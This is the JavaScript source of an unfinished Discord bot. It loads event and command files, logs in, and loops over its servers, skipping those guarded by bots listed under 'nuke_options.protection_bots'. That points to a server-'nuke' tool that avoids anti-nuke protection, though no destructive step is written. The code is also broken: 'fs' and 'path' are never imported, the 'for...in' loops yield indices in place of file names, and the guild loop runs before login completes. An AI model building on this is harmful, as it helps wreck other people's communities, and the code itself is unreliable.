const Discord = require('discord.js');

const { intents } = require('./intents');
const config = require('./config.json');

const client = new Discord.Client({intents: intents});

client.commands = new Discord.Collection();

// iterates over current directory for the 'events' directory and 'commands' directory whilst filtering for '.js' extension
// this way of filtering shouldn't be used, at all

const eventFiles = fs.readdirSync(path.join(__dirname, 'events')).filter(file => file.endsWith('.js'));
const commandFiles = fs.readdirSync(path.join(__dirname, 'commands')).filter(file => file.endsWith('.js'));

// initializes events lazily
for(const eventFile in eventFiles) {
    // gets event lazily
    const event = require(`./events/${eventFile}`);

    if(!event.data.once) {
        client.on(event.name, (...args) => event.execute(client, ...args));
    } else {
        client.once(event.name, (...args) => event.execute(client, ...args));
    }
}

for(const commandFile in commandFiles) {
    // gets command lazily
    const command = require(`./commands/${commandFile}`);

    client.commands.set(command.data.name, command);
}

client.login(config.client_options.token).then(() => {
    console.log(`Logged in as: ${client.user.username}`);
});

for(const [id, guild] of client.guilds.cache) {
    var me = guild.members.me;

    if(guild.members.cache.hasAny(config.nuke_options.protection_bots)) {
        continue;
    }


}
